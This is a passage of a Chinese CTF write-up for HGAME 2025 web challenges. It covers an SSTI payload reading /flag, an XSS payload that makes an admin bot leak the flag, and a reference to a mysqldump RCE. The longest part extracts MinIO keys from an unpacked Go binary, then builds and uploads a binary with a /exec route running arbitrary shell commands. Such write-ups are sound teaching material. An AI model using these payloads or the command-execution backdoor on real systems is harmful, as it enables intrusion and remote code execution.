class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data=&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;(QwQ.__eq__.__globals__.sys.modules.os.popen(&#x27;cat /flag&#x27;)).read()&#125;&#125;&quot;</span>&#125;<br>    put=requests.post(url=<span class="hljs-string">&quot;http://hgame.vidar.club:44678/app/send&quot;</span>,data=data)<br>    <span class="hljs-built_in">print</span>(put.text)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    get=requests.get(url=<span class="hljs-string">&quot;http://hgame.vidar.club:44678/app/read&quot;</span>)<br>    <span class="hljs-built_in">print</span>(get.text)<br></code></pre></td></tr></table></figure><p><img src="http://notes.gwwafz.online/uploads/821d951b-23cf-4681-b2a8-9a8434e7a64a.png"></p><h2 id="双面人派对"><a href="#双面人派对" class="headerlink" title="双面人派对"></a>双面人派对</h2><p>题目描述依旧财迷，开题看看<br>发现有两个容器  </p><p>一个给了一个名为main的文件<br>dir扫了两个链接的目录，没发现  </p><p>完全没思路。<br>直接看<a href="https://xz.aliyun.com/news/16802">wp</a>吧  </p><p>tags: go逆向，minio，go脱壳<br>拿到的main文件是go编译的程序<br><img src="http://notes.gwwafz.online/uploads/bd396a0d-ff24-42f8-8811-ee47028560f4.png"></p><blockquote><p>[GIN-debug] 和 github.com&#x2F;gin-gonic&#x2F;gin 是 Go Web 框架的典型输出  </p></blockquote><p>可以看到这个一直报错无法连接127.0.0.1:9000<br>可能判断应该是一个内网程序<br>再让ai分析一下特征<br><img src="http://notes.gwwafz.online/uploads/c62cf57b-505d-44a4-8191-9f3ef71cb341.png"></p><p>使用upx 脱壳  </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">upx -d <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure><p>然后可以直接用010找:<br><img src="http://notes.gwwafz.online/uploads/4ae76e5f-da4f-4e82-b887-21f6e7464e08.png"></p><p>能看到有一串字符:  </p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">access_key:</span> <span class="hljs-string">&quot;minio_admin&quot;</span><br><span class="hljs-symbol">secret_key:</span> <span class="hljs-string">&quot;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=&quot;</span><br><span class="hljs-symbol">bucket:</span> <span class="hljs-string">&quot;prodbucket&quot;</span><br><span class="hljs-symbol">key:</span> <span class="hljs-string">&quot;update&quot;</span> <br></code></pre></td></tr></table></figure><p>能看到应该是一串用于链接127.0.0.1:9000 端口上minio服务的key<br>然后是minlo，哎，该来的还是逃不掉<br>下载mc管理器(minio_client)  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://dl.min.io/client/mc/release/linux-amd64/mc<br><br><span class="hljs-built_in">chmod</span> +x mc<br><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mv</span> mc /usr/local/bin/<br></code></pre></td></tr></table></figure><p>然后尝试连接：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mc <span class="hljs-built_in">alias</span> <span class="hljs-built_in">set</span> myminio http://hgame.vidar.club:42849 minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=<br></code></pre></td></tr></table></figure><p><img src="http://notes.gwwafz.online/uploads/141b364f-b8d0-4b60-bd9b-084402b8a3ba.png"><br>显示成功添加-桶子?  </p><p>然后可以进行以下操作:  </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">//查看容器</span><br>mc <span class="hljs-keyword">ls</span> myminio/hints<br><br><span class="hljs-comment">//下载容器内容</span><br>mc mirror myminio/hints src.<span class="hljs-keyword">zip</span><br></code></pre></td></tr></table></figure><p>然后拿到源码:  </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// main  </span><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;level25/fetch&quot;</span><br><br><span class="hljs-string">&quot;level25/conf&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/jpillora/overseer&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fetcher := &amp;fetch.MinioFetcher&#123;<br>Bucket:    conf.MinioBucket,<br>Key:       conf.MinioKey,<br>Endpoint:  conf.MinioEndpoint,<br>AccessKey: conf.MinioAccessKey,<br>SecretKey: conf.MinioSecretKey,<br>&#125;<br>overseer.Run(overseer.Config&#123;<br>Program: program,<br>Fetcher: fetcher,<br>&#125;)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>g := gin.Default()<br>g.StaticFS(<span class="hljs-string">&quot;/&quot;</span>, gin.Dir(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">true</span>))<br>g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在主路由程序里加上命令执行功能然后再编译，用mc上传<br>不懂go的写法，直接拿师傅的wp<br><a href="https://www.cnblogs.com/TouHp/p/18707742">https://www.cnblogs.com/TouHp/p/18707742</a>  </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;level25/fetch&quot;</span><br><span class="hljs-string">&quot;level25/conf&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/jpillora/overseer&quot;</span><br><span class="hljs-string">&quot;os/exec&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fetcher := &amp;fetch.MinioFetcher&#123;<br>Bucket:    conf.MinioBucket,<br>Key:       conf.MinioKey,<br>Endpoint:  conf.MinioEndpoint,<br>AccessKey: conf.MinioAccessKey,<br>SecretKey: conf.MinioSecretKey,<br>&#125;<br>overseer.Run(overseer.Config&#123;<br>Program: program,<br>Fetcher: fetcher,<br>&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">program</span><span class="hljs-params">(state overseer.State)</span></span> &#123;<br>g := gin.Default()<br>g.StaticFS(<span class="hljs-string">&quot;/&quot;</span>, gin.Dir(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">true</span>))<br><br><span class="hljs-comment">// 添加命令执行路由</span><br>g.GET(<span class="hljs-string">&quot;/exec&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>cmdStr := c.Query(<span class="hljs-string">&quot;cmd&quot;</span>)<br><span class="hljs-keyword">if</span> cmdStr == <span class="hljs-string">&quot;&quot;</span> &#123;<br>c.String(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing &#x27;cmd&#x27; parameter&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>cmd := exec.Command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmdStr)<br>output, err := cmd.CombinedOutput()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;Error: %v\nOutput: %s&quot;</span>, err, output)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.Data(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;text/plain&quot;</span>, output)<br>&#125;)<br><br>g.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后编译，这里编译要下很多组件，而且在国内网络环境下不了，记得用办法将整机流量代理一下  </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> build -<span class="hljs-keyword">o</span> <span class="hljs-keyword">update</span> main.<span class="hljs-keyword">go</span><br><br>//最后上传文件  <br>./mc <span class="hljs-keyword">cp</span> <span class="hljs-keyword">update</span> myminio/prodbucket/<span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure><p><img src="http://notes.gwwafz.online/uploads/5ab42066-f938-4ff0-8fd1-43303251f987.png"></p><p><a href="https://www.cnblogs.com/TouHp/p/18707742">https://www.cnblogs.com/TouHp/p/18707742</a></p><h2 id="MysteryMessageBoard"><a href="#MysteryMessageBoard" class="headerlink" title="MysteryMessageBoard"></a>MysteryMessageBoard</h2><p>tags: xss</p><blockquote><p>不安全 | 正在勘探中 | 少量实体<br>在一个昏暗的空间里，存在着一块神秘的留言板，挂在虚拟墙壁上，仿佛可以窥见外界的光明。每一条信息都能带来不同的后果，但它们都被一个神秘的管理者所审视，这位管理者决定了谁能够通过这扇门，谁将永远被困在这片虚拟的牢笼中。<br>这块留言板被某种看不见的力量所控制，留言的内容似乎会触发某种仪式，每个输入的字符都充满了未知的能量。输入者的每一句话，都可能成为被审视的焦点，甚至引发一种奇异的变化，仿佛信息的力量能够改变现实，带着留言者穿越虚拟与真实的边界。<br>这块留言板上的秘密，正等待着被揭开<br>（容器内端口为8888）  </p></blockquote><p>根据题意可能是xss,这种一般是一个留言板加bot组合  </p><p>给了源码：  </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/chromedp/chromedp&quot;</span><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/gorilla/sessions&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-comment">// 账户认证</span><br><span class="hljs-keyword">var</span> (<br>store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;fake_key&quot;</span>)) <span class="hljs-comment">//sessions key</span><br>users = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<br><span class="hljs-string">&quot;shallot&quot;</span>: <span class="hljs-string">&quot;fake_password&quot;</span>, <span class="hljs-comment">//两个账户</span><br><span class="hljs-string">&quot;admin&quot;</span>:   <span class="hljs-string">&quot;fake_password&quot;</span>&#125;<br>comments []<span class="hljs-type">string</span><br>flag     = <span class="hljs-string">&quot;FLAG&#123;this_is_a_fake_flag&#125;&quot;</span><br>lock     sync.Mutex<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">loginHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>username := c.PostForm(<span class="hljs-string">&quot;username&quot;</span>)<br>password := c.PostForm(<span class="hljs-string">&quot;password&quot;</span>)<br><span class="hljs-keyword">if</span> storedPassword, ok := users[username]; ok &amp;&amp; storedPassword == password &#123;<br>session, _ := store.Get(c.Request, <span class="hljs-string">&quot;session&quot;</span>)<br>session.Values[<span class="hljs-string">&quot;username&quot;</span>] = username<br>session.Options = &amp;sessions.Options&#123;<br>Path:     <span class="hljs-string">&quot;/&quot;</span>,<br>MaxAge:   <span class="hljs-number">3600</span>,<br>HttpOnly: <span class="hljs-literal">false</span>,<br>Secure:   <span class="hljs-literal">false</span>,<br>&#125;<br>session.Save(c.Request, c.Writer)<br>c.String(http.StatusOK, <span class="hljs-string">&quot;success&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>log.Printf(<span class="hljs-string">&quot;Login failed for user: %s\n&quot;</span>, username)<br>c.String(http.StatusUnauthorized, <span class="hljs-string">&quot;error&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">logoutHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, _ := store.Get(c.Request, <span class="hljs-string">&quot;session&quot;</span>)<br><span class="hljs-built_in">delete</span>(session.Values, <span class="hljs-string">&quot;username&quot;</span>)<br>session.Save(c.Request, c.Writer)<br>c.Redirect(http.StatusFound, <span class="hljs-string">&quot;/login&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">indexHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>session, _ := store.Get(c.Request, <span class="hljs-string">&quot;session&quot;</span>)<br>username, ok := session.Values[<span class="hljs-string">&quot;username&quot;</span>].(<span class="hljs-type">string</span>)<br><span class="hljs-keyword">if</span> !ok &#123;<br>log.Println(<span class="hljs-string">&quot;User not logged in, redirecting to login&quot;</span>)<br>c.Redirect(http.StatusFound, <span class="hljs-string">&quot;/login&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> c.Request.Method == http.MethodPost &#123;<br>comment := c.PostForm(<span class="hljs-string">&quot;comment&quot;</span>)<br>log.Printf(<span class="hljs-string">&quot;New comment submitted: %s\n&quot;</span>, comment)<br>comments = <span class="hljs-built_in">append</span>(comments, comment)<br>&#125;<br>htmlContent := fmt.Sprintf(<span class="hljs-string">`&lt;html&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">&lt;h1&gt;留言板&lt;/h1&gt;</span><br><span class="hljs-string">&lt;p&gt;欢迎，%s，试着写点有意思的东西吧，admin才不会来看你！自恋的笨蛋！&lt;/p&gt;</span><br><span class="hljs-string">&lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">&lt;textarea name=&quot;comment&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="hljs-string">&lt;input type=&quot;submit&quot; value=&quot;提交评论&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;h3&gt;留言:&lt;/h3&gt;</span><br><span class="hljs-string">&lt;ul&gt;`</span>, username)<br><span class="hljs-keyword">for</span> _, comment := <span class="hljs-keyword">range</span> comments &#123;<br>htmlContent += <span class="hljs-string">&quot;&lt;li&gt;&quot;</span> + comment + <span class="hljs-string">&quot;&lt;/li&gt;&quot;</span><br>&#125;<br>htmlContent += <span class="hljs-string">`&lt;/ul&gt;</span><br><span class="hljs-string">&lt;p&gt;&lt;a href=&quot;/logout&quot;&gt;退出&lt;/a&gt;&lt;/p&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;`</span><br>c.Data(http.StatusOK, <span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="hljs-type">byte</span>(htmlContent))<br>&#125;<br><span class="hljs-comment">//这个admin应该就是bot</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">adminHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;  <br>htmlContent := <span class="hljs-string">`&lt;html&gt;&lt;body&gt;</span><br><span class="hljs-string">&lt;p&gt;好吧好吧你都这么求我了~admin只好勉为其难的来看看你写了什么~才不是人家想看呢！&lt;/p&gt;</span><br><span class="hljs-string">&lt;/body&gt;&lt;/html&gt;`</span><br>c.Data(http.StatusOK, <span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="hljs-type">byte</span>(htmlContent))<br><span class="hljs-comment">//无头浏览器模拟登录admin，并以admin身份访问/路由</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>lock.Lock()<br><span class="hljs-keyword">defer</span> lock.Unlock()<br>ctx, cancel := chromedp.NewContext(context.Background())<br><span class="hljs-keyword">defer</span> cancel()<br>ctx, _ = context.WithTimeout(ctx, <span class="hljs-number">20</span>*time.Second)<br><span class="hljs-keyword">if</span> err := chromedp.Run(ctx, myTasks()); err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Chromedp error:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;()<br>&#125;<br><br><span class="hljs-comment">// 无头浏览器操作</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myTasks</span><span class="hljs-params">()</span></span> chromedp.Tasks &#123;<br><span class="hljs-keyword">return</span> chromedp.Tasks&#123;<br>chromedp.Navigate(<span class="hljs-string">&quot;/login&quot;</span>),<br>chromedp.WaitVisible(<span class="hljs-string">`input[name=&quot;username&quot;]`</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;username&quot;]`</span>, <span class="hljs-string">&quot;admin&quot;</span>),<br>chromedp.SendKeys(<span class="hljs-string">`input[name=&quot;password&quot;]`</span>, <span class="hljs-string">&quot;fake_password&quot;</span>),<br>chromedp.Click(<span class="hljs-string">`input[type=&quot;submit&quot;]`</span>),<br>chromedp.Navigate(<span class="hljs-string">&quot;/&quot;</span>),<br>chromedp.Sleep(<span class="hljs-number">5</span> * time.Second),<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">flagHandler</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>log.Println(<span class="hljs-string">&quot;Handling flag request&quot;</span>)<br>session, err := store.Get(c.Request, <span class="hljs-string">&quot;session&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.String(http.StatusInternalServerError, <span class="hljs-string">&quot;无法获取会话&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>username, ok := session.Values[<span class="hljs-string">&quot;username&quot;</span>].(<span class="hljs-type">string</span>)<br><span class="hljs-keyword">if</span> !ok || username != <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>c.String(http.StatusForbidden, <span class="hljs-string">&quot;只有admin才可以访问哦&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>log.Println(<span class="hljs-string">&quot;Admin accessed the flag&quot;</span>)<br>c.String(http.StatusOK, flag)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.GET(<span class="hljs-string">&quot;/login&quot;</span>, loginHandler)<br>r.POST(<span class="hljs-string">&quot;/login&quot;</span>, loginHandler)<br>r.GET(<span class="hljs-string">&quot;/logout&quot;</span>, logoutHandler)<br>r.GET(<span class="hljs-string">&quot;/&quot;</span>, indexHandler)<br>r.GET(<span class="hljs-string">&quot;/admin&quot;</span>, adminHandler)<br>r.GET(<span class="hljs-string">&quot;/flag&quot;</span>, flagHandler)<br>log.Println(<span class="hljs-string">&quot;Server started at :8888&quot;</span>)<br>log.Fatal(r.Run(<span class="hljs-string">&quot;:8888&quot;</span>))<br>&#125;<br></code></pre></td></tr></table></figure><p>攻击思路，在留言板写下xss，然后访问&#x2F;admin，这时程序模拟浏览器来访问后触发xss<br>这时候在xss写的可以是admin的session，或者让admin访问&#x2F;flag然后传回来，看留言板功能<br>题目给了内部端口为8888 看来能直接尝试写到留言板里  </p><p>由于admin是关键，应该不会是弱口令，先尝试shallot<br>这里不知道shallot的账户和密码，先尝试扫目录和爆破密码  </p><p>扫目录没发现什么结果<br>爆破密码得到密码为： 888888   </p><p>写xss：  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/&#x27;</span>,&#123;<span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-attr">headers</span>:&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,<span class="hljs-attr">body</span>:<span class="hljs-string">&#x27;comment=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(f)&#125;))</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>让后访问&#x2F;admin<br>得到结果：  </p><p><img src="http://notes.gwwafz.online/uploads/e9e4c541-d231-4f68-b01d-5b5362f0c848.png"></p><h2 id="HoneyPot-revenge"><a href="#HoneyPot-revenge" class="headerlink" title="HoneyPot_revenge"></a>HoneyPot_revenge</h2><p>这次把passwd的部分也添加过滤了<br>但是注意利用点：  </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">dumpCmd := exec.Command(<span class="hljs-string">&quot;mysqldump&quot;</span>,<br><span class="hljs-string">&quot;-h&quot;</span>, config.RemoteHost,<br><span class="hljs-string">&quot;-u&quot;</span>, config.RemoteUsername,<br><span class="hljs-string">&quot;-p&quot;</span>+config.RemotePassword,<br>config.RemoteDatabase)<br></code></pre></td></tr></table></figure><p>mysql的mysqldump备份是有漏洞能利用到rce的<br>漏洞原理：<br><a href="https://www.freebuf.com/vuls/411090.html">CVE-2024-21096</a>  </p><p>平台环境问题无法复现，具体操作来看这位师傅的：<a href="https://blog.xrntkk.top/post/hgame_2025/#level-21096-honeypot_revenge">https://blog.xrntkk.top/post/hgame_2025/#level-21096-honeypot_revenge</a>  </p><h2 id="HoneyPot"><a href="#HoneyPot" class="headerlink" title="HoneyPot"></a>HoneyPot</h2><p>根据题目猜测可能是蜜罐题，看一眼源码,发现多的一批，用ai帮审计一下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 